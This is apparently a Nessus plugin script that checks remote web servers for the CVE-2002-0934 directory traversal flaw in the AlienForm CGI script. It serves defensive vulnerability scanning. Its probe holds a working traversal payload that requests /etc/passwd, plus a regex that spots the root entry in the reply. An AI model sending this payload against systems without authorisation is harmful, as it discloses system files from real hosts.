#
# This script was written by Andrew Hintz ( http://guh.nu )
# 	and is based on code writen by Renaud Deraison
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(11027);
 script_bugtraq_id(4983);
 script_osvdb_id(836);
 script_version("$Revision: 1.26 $");
 script_cve_id("CVE-2002-0934");

 script_name(english:"AlienForm2 alienform.cgi Traversal Arbitrary File Manipulation");
 script_summary(english:"Checks if the AlienForm CGI script is vulnerable");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a Perl application that is affected by a
directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The AlienForm CGI script allows an attacker to view any file on the
target computer, append arbitrary data to an existing file, and write
arbitrary data to a new file.

The AlienForm CGI script is installed as either af.cgi or
alienform.cgi." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jun/73" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/06/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/06/10");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002-2016 Andrew Hintz (http://guh.nu)");

 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
afcgi[0] = "af.cgi";
afcgi[1] = "alienform.cgi";

for(d=0;afcgi[d];d=d+1)
{
   req = string(dir, "/", afcgi[d], "?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd");
   req = http_get(item:req, port:port);
   result = http_keepalive_send_recv(port:port, data:req);
   if(result == NULL)exit(0);
   if(egrep(pattern:"root:.*:0:[01]:.*", string:result)){
   	security_warning(port);
	exit(0);
	}
}
}
